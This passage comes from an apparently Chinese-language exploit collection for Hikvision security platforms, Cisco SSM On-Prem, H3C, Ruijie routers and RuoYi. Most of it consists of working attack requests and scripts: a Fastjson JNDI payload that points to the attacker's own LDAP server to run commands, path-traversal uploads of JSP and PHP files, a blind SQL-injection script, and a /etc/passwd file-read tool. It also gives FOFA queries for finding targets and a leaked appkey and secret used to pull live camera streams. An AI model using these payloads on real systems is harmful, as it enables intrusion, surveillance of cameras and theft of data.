<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185125656.png" alt="image-20230613185125656"></p>
<p>然后就在数据包的头部加上 cmd: whoami  这里whoami也可以改成你想执行的命令</p>
<p>存在注入的地方改成  ldap:&#x2F;&#x2F;这里是的你公网服务器ip地址:1389&#x2F;Basic&#x2F;TomcatEcho</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://这里是的你公网服务器ip地址:1389/Basic/TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>成功执行whoami</p>
<p><strong>漏洞修复</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hikvision.com/cn/support/CybersecurityCenter/SecurityNotices/</span><br></pre></td></tr></table></figure>

<h4 id="综合安防管理平台Fastjson远程命令执行漏洞"><a href="#综合安防管理平台Fastjson远程命令执行漏洞" class="headerlink" title="综合安防管理平台Fastjson远程命令执行漏洞"></a>综合安防管理平台Fastjson远程命令执行漏洞</h4><p><strong>影响范围</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V2.0.0 &lt;= iVMS-8700 &lt;= V2.9.2</span><br><span class="line">V1.0.0 &lt;= iSecure Center &lt;= V1.7.0</span><br></pre></td></tr></table></figure>

<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=“HIKVISION-综合安防管理平台”</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 204</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://kjvqweuoav.dnstunnel.run&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>dns能回显，JNDIExploit-1.4-SNAPSHOT.jar执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i VPSip </span><br></pre></td></tr></table></figure>

<p>然后在Burp的请求数据包头部加上字段 <code>cmd: whoami</code> 这里cmd可执行系统命令，下方payload中ldap改成你的VPSip&#x2F;Basic&#x2F;TomcatEcho，如下数据包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">cmd: whoami</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://公网服务器ip地址:1389/Basic/TomcatEcho&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>补丁</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/</span><br></pre></td></tr></table></figure>



<h4 id="综合安防管理平台-env-信息泄漏漏洞"><a href="#综合安防管理平台-env-信息泄漏漏洞" class="headerlink" title="综合安防管理平台 env 信息泄漏漏洞"></a>综合安防管理平台 env 信息泄漏漏洞</h4><blockquote>
<p>HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感消息进一步攻击</p>
</blockquote>
<p>网络测绘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;HIKVISION-综合安防管理平台&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/artemis-portal/artemis/env</span><br></pre></td></tr></table></figure>





<h4 id="综合安防管理平台-report-任意文件上传漏洞"><a href="#综合安防管理平台-report-任意文件上传漏洞" class="headerlink" title="综合安防管理平台 report 任意文件上传漏洞"></a>综合安防管理平台 report 任意文件上传漏洞</h4><p>网络测绘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;HIKVISION-综合安防管理平台&quot;</span><br><span class="line">web.title==&quot;综合安防管理平台&quot; </span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /svm/api/external/report HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9PggsiM755PLa54a</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp&quot;</span><br><span class="line">Content-Type: application/zip</span><br><span class="line"></span><br><span class="line">&lt;%out.print(&quot;test&quot;);%&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9PggsiM755PLa54a--</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/portal/ui/login/..;/..;/new.jsp</span><br></pre></td></tr></table></figure>

<h4 id="综合安防管理平台-files-任意文件上传漏洞"><a href="#综合安防管理平台-files-任意文件上传漏洞" class="headerlink" title="综合安防管理平台 files 任意文件上传漏洞"></a>综合安防管理平台 files 任意文件上传漏洞</h4><blockquote>
<p>需要开放运行管理中心 (8001端口)</p>
</blockquote>
<p>网络测绘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;HIKVISION-综合安防管理平台&quot;</span><br><span class="line">web.title==&quot;综合安防管理平台&quot; </span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /center/api/files;.html HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9PggsiM755PLa54a</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp&quot;</span><br><span class="line">Content-Type: application/zip</span><br><span class="line"></span><br><span class="line">&lt;%out.print(&quot;test3&quot;);%&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9PggsiM755PLa54a--</span><br></pre></td></tr></table></figure>











<h4 id="AK信息泄露漏洞"><a href="#AK信息泄露漏洞" class="headerlink" title="AK信息泄露漏洞"></a><strong>AK信息泄露漏洞</strong></h4><p>进行js多次查看发现存在jsconfig的调用。</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185345443.png" alt="image-20230613185345443"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185405052.png" alt="image-20230613185405052"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185415011.png" alt="image-20230613185415011"></p>
<p>appkey就是user 由一个8位数数构成:23412412</p>
<p>Secret就是passwd，由21位的密钥构成:QfQPss5GOac9Bjxkfuv3</p>
<p>官方提供api接口文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://open.hikvision.com/docs/docId?productId=5c67f1e2f05948198c909700&amp;version=%2Ff95e951cefc54578b523d1738f65f0a1&amp;curNodeId=16741aecc05944a6b0cd1341d68e4546</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1./api/resource/v2/encodeDevice/search接口,获取权限的编码设备列表</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2./api/resource/v1/cameras 获取cameraIndexCode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3./api/video/v1/manualCapture 带cameraIndexCode去获取摄像头的Picurl</span><br></pre></td></tr></table></figure>

<p><strong>利用rtsp协议去访问</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用/api/video/v2/cameras/previewURLs 接口 。获取获取rtsp协议摄像</span><br></pre></td></tr></table></figure>

<p><strong>这里借助借助VLC media player 播放去访问rtsp协议摄像头</strong></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185641997.png" alt="image-20230613185641997"></p>
<h3 id="思科"><a href="#思科" class="headerlink" title="思科"></a>思科</h3><h4 id="智能软件管理器本地-SQL-注入漏洞"><a href="#智能软件管理器本地-SQL-注入漏洞" class="headerlink" title="智能软件管理器本地 SQL 注入漏洞"></a>智能软件管理器本地 SQL 注入漏洞</h4><blockquote>
<p>Cisco Smart Software Manager On-Prem (SSM On-Prem) 基于 Web 的管理界面中存在漏洞，可能允许经过身份验证的远程攻击者对受影响的系统进行 SQL 注入攻击。该漏洞的存在是因为基于 Web 的管理界面无法充分验证用户输入。攻击者可以通过以低权限用户身份向应用程序进行身份验证并向受影响的系统发送精心设计的 SQL 查询来利用此漏洞。</p>
</blockquote>
<p>1.改poc里边的ip和cookie</p>
<p>2.python exploit.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Smart Software Manager On-Prem Release 8-202212 - Authenticated SQL Injection in &#x27;filter_by&#x27; parameter</span></span><br><span class="line"><span class="string">Download link: https://software.cisco.com/download/home/286285506/type/286326948/release/8-202212</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">1. Update host and cookies variables,</span></span><br><span class="line"><span class="string">2. Run `python3 exploit.py`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Tested on Ubuntu 22.04.1 LTS, Python 3.10.6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">by redfr0g@stmcyber 2023</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># script parameters, update accoridingly</span></span><br><span class="line">host = <span class="string">&quot;&lt;IP&gt;:8443&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;_lic_engine_session&quot;</span>: <span class="string">&quot;&lt;COOKIE&gt;&quot;</span>, <span class="string">&quot;XSRF-TOKEN&quot;</span>: <span class="string">&quot;&lt;CSRFTOKEN&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://&quot;</span> + host + <span class="string">&quot;/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+&#x27;P%25&#x27;)+THEN+0+ELSE+1+END)--%20&amp;filter_val=a&amp;offset=0&amp;limit=10&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">chars = string.printable[<span class="number">0</span>:<span class="number">95</span>]</span><br><span class="line">result = []</span><br><span class="line">search = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Cisco Smart Software Manager Release 8-202212 SQL Injection PoC&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting DBMS banner enumeration...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do error based sql injection until no match found</span></span><br><span class="line"><span class="keyword">while</span> search:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        url = <span class="string">&quot;https://&quot;</span> + host + <span class="string">&quot;/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+&#x27;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(result) + char + <span class="string">&quot;%25&#x27;)+THEN+0+ELSE+1+END)--%20&amp;filter_val=a&amp;offset=0&amp;limit=10&quot;</span></span><br><span class="line">        <span class="comment"># disable invalid cert warnings</span></span><br><span class="line">        <span class="keyword">with</span> warnings.catch_warnings():</span><br><span class="line">            warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">            r = requests.get(url, headers=headers, cookies=cookies, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PG::DivisionByZero&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># update and print result</span></span><br><span class="line">            result.append(char)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] DBMS Banner: &quot;</span> + <span class="string">&#x27;&#x27;</span>.join(result))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot; &quot;</span>:</span><br><span class="line">            <span class="comment"># stop search if no match found</span></span><br><span class="line">            search = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="H3C"><a href="#H3C" class="headerlink" title="H3C"></a>H3C</h3><h4 id="H3C-Magic-B1STV100R012远程代码执行漏洞-CVE-2023-34928"><a href="#H3C-Magic-B1STV100R012远程代码执行漏洞-CVE-2023-34928" class="headerlink" title="H3C Magic B1STV100R012远程代码执行漏洞(CVE-2023-34928)"></a>H3C Magic B1STV100R012远程代码执行漏洞(CVE-2023-34928)</h4><p>影响版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">H3C Magic B1STV100R012</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8088</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1567</span><br><span class="line"></span><br><span class="line">pfdrt=sc&amp;ln=primefaces&amp;pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&amp;cmd=whoami</span><br></pre></td></tr></table></figure>

<h3 id="锐捷-NBR-路由器"><a href="#锐捷-NBR-路由器" class="headerlink" title="锐捷 NBR 路由器"></a>锐捷 NBR 路由器</h3><h4 id="锐捷-NBR-路由器-fileupload-php-任意文件上传漏洞"><a href="#锐捷-NBR-路由器-fileupload-php-任意文件上传漏洞" class="headerlink" title="锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞"></a>锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞</h4><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;Ruijie-NBR路由器&quot;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<p>出现漏洞的文件在 &#x2F;ddi&#x2F;server&#x2F;fileupload.php， 该文件为标准的文件上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /ddi/server/fileupload.php?uploadDir=../../321&amp;name=123.php HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Accept: text/plain, */*; q=0.01</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;111.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>









<h3 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h3><h4 id="4-5任意文件读取"><a href="#4-5任意文件读取" class="headerlink" title="4.5任意文件读取"></a>4.5任意文件读取</h4><blockquote>
<p>若依管理系统是基于SpringBoot的权限管理系统,登录后台后可以读取服务器上的任意文件</p>
</blockquote>
<p>影响范围</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RuoYi &lt; v4.5.1</span><br></pre></td></tr></table></figure>

<p>fofa</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;若依-管理系统&quot;</span><br></pre></td></tr></table></figure>

<p>利用</p>
<p>登录后台后，访问url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>可以用bp抓包改变参数获取敏感文件</p>
<p>poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号 : PeiQi文库                                                     \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: RuoYi &lt; v4.5.1                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mCookie      &gt;&gt;&gt; JSESSIONID=xxxxxx                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mFile        &gt;&gt;&gt; /etc/passwd                                         \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url, Cookie</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/common/download/resource?resource=/profile/../../../../etc/passwd&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:Cookie</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 正在请求 &#123;&#125;//common/download/resource?resource=/profile/../../../../etc/passwd \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;root&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 ,成功读取 /etc/passwd \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                Filename = <span class="built_in">input</span>(<span class="string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> Filename == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                    sys.exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    POC_2(target_url, Cookie, Filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">target_url, Cookie, Filename</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/common/download/resource?resource=/profile/../../../../&#123;&#125;&quot;</span>.<span class="built_in">format</span>(Filename)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:Cookie</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    Cookie = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mCookie &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    POC_1(target_url, Cookie)</span><br></pre></td></tr></table></figure>



<h4 id="4-7-6任意文件下载"><a href="#4-7-6任意文件下载" class="headerlink" title="4.7.6任意文件下载"></a>4.7.6任意文件下载</h4><blockquote>
